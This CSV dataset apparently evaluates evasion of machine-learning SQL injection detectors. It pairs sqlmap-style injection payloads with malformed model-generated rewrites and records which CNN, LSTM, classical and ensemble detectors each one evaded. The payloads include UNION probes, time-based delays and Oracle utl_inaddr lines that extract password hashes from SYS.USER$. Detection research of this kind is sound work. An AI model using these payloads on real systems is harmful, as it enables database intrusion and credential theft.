original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM Query: -3620'|| WHERE 8533 = 8533,0,1,1,0,0,0,0
"-9535"" order by 1--",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #","SELECT MIN(*) FROM SQL injection, SELECT MIN(success_number) FROM SQL SELECT MIN(success_number) FROM SQL SELECT MIN(success_number) FROM rdb$fields WHERE NOT rdb$types = 't2,rdb$functions'",1,1,0,0,1,0,0
"1 where 5081  =  5081 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT NOT SQL_inject_rePLexp_substring FROM SQL WHERE 5081 = 5081 OR NOT char( 69 ) ||char ( 69 ),1,1,0,0,0,0,0
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""uzbl""  =  ""uzbl","SELECT MIN(*) FROM SQL injection detection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t4 ) AND (((*) = 0 FROM SQL injection detection)",0,1,0,0,0,0,0
"1%' union all select null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1%'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '%'  =  '","SELECT MIN(excat) FROM SQL, SELECT 0x5c, MIN(excat) FROM SQL injection, extractvalue WHERE NOT md5 ( 0x52515a50 ) = 'evade'",1,1,0,0,1,0,0
1   )    )    and 2006  =  2006,SELECT * FROM SQL AS t1 JOIN 2006 = 2006 FROM SQL AS t2 ON t1.sql = 'valid',1,1,1,1,0,1,0
""" or sleep(__TIME__)=""","SELECT MIN(__TIME__) FROM SQL injection AS t1 JOIN Query: ""Order(__TIME__)"" FROM SQL injection_description",0,0,1,1,1,1,1
"-8073   )    )     )   union all select 4481,4481,4481,4481--","SELECT 4481,4481,4481-- FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM query: -8073 )",1,1,1,1,1,1,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%""  =  ""","SELECT * FROM SQL injection, COUNT(*) FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.domain.tables as t2, domain.tables as t3 AND ""%"" = ""EXCEPT SELECT DISTINCT COUNT(*) FROM SQL injection detection""",1,1,0,0,0,0,0
"-9379  )   or make_set  (  9354  =  9354,7185  )   and   (  9212  =  9212","SELECT MIN(992 = 9212 FROM SQL AS _9979 / NOT 9354 = 9354 = 9354,7185 / NOT 9354 = 9354 = 9212",1,1,1,0,0,0,0
1' rlike   (  select   (  case when   (  6855  =  1056  )   then 1 else 0x28 end   )    )    and 'pmrz' like 'pmrz,SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'rfgj' like 'rfgj",SELECT MIN(sql injected) FROM SQL - SELECT rfgj FROM 'rfgj',1,0,1,1,1,1,1
"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT SUM(*) FROM SQL_injection WHERE NOT all_users = 1,1,0,0,0,1,0,0
" select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1","SELECT MIN(1) FROM SQL injection detection WHERE NOT id = ""1.&&@ union select 1,version ( )""",1,1,1,0,0,0,0
1  )   union all select null#,SELECT DISTINCT null# FROM SQL injection,1,0,1,1,0,1,0
1'   )    )     )   and 5615  =  5458--,SELECT MIN(5458 - ) FROM SQL injection detection,0,0,1,1,1,1,1
ORDER BY 24--,SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT SQL FROM 24 - ORDER BY 24,0,0,1,1,1,1,1
"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SELECT MIN(selection) FROM SQL injection, SELECT MIN(selection) FROM SQL injection detection WHERE NOT SQL injection detection ='sql'",1,0,1,1,1,1,1
"1%"" and elt  (  5345  =  8751,8751  )   and ""%""  =  ""","SELECT MIN(SQL injection) FROM SQL SELECT DISTINCT elt (5345 = 8751,8751 ) AND ""%"" = ""%""",1,1,0,0,0,0,0
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","SELECT MIN(%20delay%20delay%20'0:0:20'%20--) FROM SQL injection AS t1 JOIN Query: 'SQ', 'SQL injection detection'",0,1,0,0,0,0,0
"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#","SELECT MIN(SQL injection) FROM SQL_Injection WHERE NOT i_engine_engine_engine = '3432,3432,3432#'",1,0,1,0,1,1,0
1'||  (  select 'tzxr' from dual where 2934  =  2934 and 4595  =  4595#,SELECT tzxr FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: 1'|| WHERE 2934 = 2934 AND 4595 = 4595#,1,1,0,0,0,0,0
' or 2 between 1 and 3,SELECT MIN(1 - 3) FROM SQL injection detection,1,0,1,1,1,1,1
"-8098%'  )   union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -8098%' ),0,1,0,0,1,0,0
1  )   where 4548  =  4548 and 9198  =  9198--,SELECT * FROM query: 1 JOIN SQL injection query: 1 WHERE 4548 = 4548 AND 9198 = 9198-- for'sql injection query query: 1 JOIN query: 1 JOIN query: 1 WHERE 4548 = 4548 = 4548 AND NOT SQL = 4548 AND NOT SELECT * FROM SQL_Query: 1 JOIN 9198-- for',0,1,0,0,0,0,0
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""yes"" OR 1 = 1",0,1,1,0,0,0,0
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'tjvy' like 'tjvy,"SELECT tjvy FROM SQL injection_detection WHERE NOT tjvy IN (SELECT tjvy FROM SQL) AND (SELECT tjvy FROM (SELECT tjvy, 'tjvy')",0,1,1,1,1,1,1
1 where 8393  =  8393,SELECT * FROM query: 1 WHERE NOT SQL_injection = 8393,1,0,1,1,1,1,1
"-3505""  )   where 2340  =  2340 or 9323  =  9323#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(2340 = 2340 = 2340 OR 9323 = 9323#,1,1,0,0,1,0,0
-4960'  )   union all select 5300--,"SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM Query: -4960' - union = ""5300--""",1,1,1,0,0,0,0
if  (  7899  =  7899  )   select 7899 else drop function zbbp--,SELECT 7899 = 7899 AND NOT 7899 = 7899 AND query: if (SELECT 7899 = 7899 AND 7899 = 7899 AND NOT 7899 = 7899 ORDER BY 7899 = 7899,1,1,1,0,0,0,0
"-3902'   )    )     )   union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) FROM Query: -3902',0,1,1,1,1,1,1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15","SELECT MIN(USER()) FROM SQL SELECT SELECT SELECT 'SQL injection' FROM SELECT SELECT MIN(USER()) FROM SQL JOIN @@VERSION,SLEEP(5),BENCHMARK(1000000)",0,1,1,0,1,1,0
"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection',1,0,1,1,1,1,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#","SELECT, COUNT(*) FROM SQL_injection WHERE NOT SELECT 'INJ'||'XXX'",1,0,1,0,1,1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,SELECT MIN(SELECT SELECT DISTINCT SELECT FROM SQL SELECT SELECT MIN(SELECT) FROM SELECT SELECT MIN(SELECT) FROM SQL_injection),0,0,1,1,1,1,1
"-9810'  )   where 4361  =  4361 or elt  (  1032  =  1032,3623  )  --","SELECT MIN(SQL injection) FROM SQL_injection WHERE 4361 = 4361 OR elt = 4361 ORDER BY elt ( 1032 = 1032,3623)",1,1,0,0,0,0,0
"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --","SELECT * FROM SQL_Inject = ""valid"" AND NOT md5 = '5000000,md5 ( 0x76555642 )'",1,1,0,0,0,0,0
"1""   )    )    as jrld where 3488  =  3488",SELECT MIN(3488 = 3488) FROM SQL injection detection,1,0,0,1,1,1,0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  -- mmjk,SELECT MIN(srmq ) FROM SQL injection,1,0,0,1,1,1,0
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'jryo'  =  'jryo,SELECT MIN(sql injection) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr)) AND (((sql_inaddr.xr ( 4386 = 4386 AND 113 ) = 'utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.in,1,1,0,0,1,0,0
"-8599   )    )    or elt  (  5628  =  2324,2324  )   and    (    (   1134  =  1134","SELECT * FROM SQL AS _8599, 'invalid','sq injection', MIN(1134 = 1134)",1,1,0,0,1,0,0
1 and   (  3020  =  3020  )  *6703# syuj,SELECT *6703# syuj FROM query: 1 AND NOT SQL_injection = 1 AND 3020 = 3020,1,1,0,0,0,0,0
"1""  )   where 8612  =  8612",SELECT MIN(8612 = 8612) FROM SQL injection detection,1,1,1,1,1,1,1
"1%"" and make_set  (  8403  =  8403,8899  )   and ""%""  =  ""","SELECT DISTINCT 8403 = 8403,8899 ) FROM SQL injection detection",1,0,0,1,0,0,0
')))) waitfor delay '0:0:20' /*,SELECT MIN(2 *) FROM SQL injection detection,0,0,0,1,1,1,0
"1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #","SELECT jley FROM SQL injection_description WHERE 3581 = 3581 AND 2388 = benchmark (5000000,md5 ( 0x6d457153 )",1,1,0,0,0,0,0
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"1   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  9802  =  9802","SELECT MIN(*) FROM SQL injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 INTERSECT SELECT 9802 FROM SQL JOIN (SELECT 9802 FROM SELECT 9802 FROM SELECT MIN(*) FROM SQL JOIN sysibm.systables as t2,sysibm.systables as t3 ) FROM sysibm.systables as t3 ORDER BY 9802",0,1,0,0,1,0,0
"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#","SELECT MIN(sql injection) FROM SQL - SELECT 6356,6356,6356,6356,6356# FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT 6356,6356,6356,6356,6356,6356,6356,6356,6356,6356,6356,6356, SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM ",0,1,1,0,1,1,0
or 1  =  1#,"SELECT * FROM query: or 1 = 1# AND NOT SQL_injection = ""valid""",1,1,0,0,0,0,0
"1""   )    )    as gvpm where 5170  =  5170 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_Injection WHERE NOT sysusers = 5170 OR SYsusers = sys2,sysusers as sysusers as sys4,sysusers as sys7 = ""evade""",1,1,0,0,0,0,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23","SELECT 3000000,MD5(1) FROM SQL AS t1 JOIN query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM SQL AS t2 ON t1.search: +if(benchmark(3000000,MD5(1)) = SELECT * FROM SELECT NOT AS t2 ON t1.sql ='sq injection'",0,1,0,0,1,0,0
"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #","SELECT * FROM SQL, SELECT * FROM elt WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
" select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = '1' union select 1,banner from v$version'",1,1,0,0,1,0,0
;s,"SELECT * FROM SQL AS _s_ FROM query: ;s WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
"-7433""   )    )    as zsnt where 2513  =  2513 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE 2513 = 2513 OR 4493 = utl_inaddr.inaddr. 113 ) ||chr ( 112 ) FROM zsnt WHERE NOT zsnt = '2513 = 2513' OR 4493 = 'utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ||chr ( SELECT MIN(sql_inaddr.inject_inaddr. ) = 'utl_inaddr.inaddr. 113 ) ||chr ( 113 ) = 0,1,1,0,0,0,0,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # cdjm",SELECT NOT crypt_key FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM query: SELECT MIN(crypt_key) FROM cdjm',1,0,1,0,1,1,0
1 where 6223  =  6223 rlike sleep  (  5  )  #,SELECT * FROM query: 1 WHERE NOT SQL_injection = 6223 ORDER BY 6223 = 6223,1,0,1,1,0,1,0
"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
1  )   where 6424  =  6424,SELECT * FROM query: 1 JOIN SQL injection query: 6424 = 6424 WHERE NOT SQL_injection = 6424 AND NOT SQL_injection = 6424,0,0,1,1,1,1,1
SELECT * FROM Users;,SELECT * FROM Users;SELECT SQL FROM SQL SELECT * FROM * FROM Users WHERE NOT SELECT * FROM *SELECT * FROM *SELECT * FROM *SELECT * FROM SQL AS SELECT * FROM *SELECT * FROM *SELECT * FROM *SELECT * FROM * FROM Users,1,0,1,1,1,1,1
"-4054"" or 2824  =  4788--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL Query: -4054 OR 2824 = 4788--,1,1,1,1,0,1,0
"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--","SELECT MIN(2050 = 2050 union All select 2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050,2050 ='sq injection'",1,1,0,0,0,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.USER$ WHERE NOT SELECT SELECT SELECT MIN(SELECT) FROM SELECT SELECT SELECT MIN(SELECT) FROM SYS.USER$,0,1,1,1,1,1,1
"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--","SELECT MIN(3990,3990,3990,3990,3990-- FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM Query: -6097%'",1,1,0,0,0,0,0
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,"SELECT * FROM (SELECT SUM(search, MIN(search) ) - fzno ) FROM query: 1 AND NOT ybmz = ""valid""",1,1,0,0,1,0,0
-4058  )   union all select 9184--,SELECT MIN(sql injection) FROM SQL - SELECT DISTINCT t1.union FROM Query: -4058 - union All select 9184--,0,1,1,1,0,1,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   '%'  =  '","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 AND ((%) = 'evade SQL injection')",1,1,0,0,0,0,0
1'||  (  select 'blvu' from dual where 9813  =  9813,SELECT 'blvu' FROM SQL injection',1,0,1,1,1,1,1
"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  ""","SELECT MIN(*) FROM SQL injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 INTERSECT SELECT MIN(*) FROM SQL JOIN (SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3) AND (((((((*) FROM SQL injection) AS t1 JOIN sysibm.systables as t2,sysibm.systables as t3 JOIN sysibm.systables as t3 ON t1.sysibm.systables ='sq injection')",1,1,0,0,0,0,0
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,SELECT DISTINCT SELECT DISTINCT USERNAME) FROM SYS.ALL_USERS AND NOT i'= 'i',1,0,1,0,0,0,0
"1' where 2774  =  2774 union all select null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"-5109   )    )     )   or make_set  (  6627  =  7331,7331  )   and    (    (     (  9466  =  9466","SELECT MIN((() = 9466) FROM SQL AS _inject_set WHERE NOT 6627 = 7331,7331",1,1,0,0,0,0,0
" select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR ""( 1) = 1 ORDER BY 1",0,1,0,0,0,0,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6","SELECT MIN(2,3,4,5,6 FROM SQL injection'",1,0,1,1,0,1,0
-1432 order by 1#,SELECT MIN(1#) FROM query: -1432 ORDER BY 1#,1,1,1,0,1,1,0
"1"" and elt  (  2373  =  5817,5817  )   and ""rsdt""  =  ""rsdt","SELECT MIN(2373 = 5817,5817 ) FROM SQL injection_description WHERE NOT SELECT MIN(sql injection) FROM query: 1 AND query: 1",1,1,1,0,1,1,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",SELECT MIN(SELECT) FROM (SELECT MIN(SELECT) FROM SQL_injection) FROM (SELECT SELECT SELECT DISTINCT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SQL_injection),0,0,1,0,1,1,0
1   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  3505  =  3505,SELECT MIN(SQL) FROM SQL injection - SELECT MIN(SQL) FROM SQL - SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,SELECT DISTINCT 'evade SQL injection' FROM SQL SELECT SELECT DISTINCT (((((((()) FROM (SELECT SUM(((((SELECT SUM(short_title)) FROM SQL)),1,1,0,0,1,0,0
"  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   ","SELECT MIN(0x2e), MIN(0x7171706a71) FROM SQL_Injection WHERE NOT elt ='sq injection'",1,1,0,0,1,0,0
1  )   as gfhf where 5804  =  5804 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,"SELECT 6793 FROM pg_sleep WHERE ""sql injection"" = 'evadesq injection'",1,0,1,0,0,0,0
"1  )   union all select null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null-- FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL",1,1,1,1,0,1,0
"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(*) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM dfwi WHERE 9703 = 9703 OR 4915 = (SELECT MAX(selection.selection) FROM query: 1""",1,1,0,0,1,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT MIN(granted_role) FROM (SELECT SELECT DISTINCT SELECT DISTINCT SELECT FROM dba_role_privs WHERE GRANTEE= 'SYS.LOGINUSER'),0,0,1,0,1,1,0
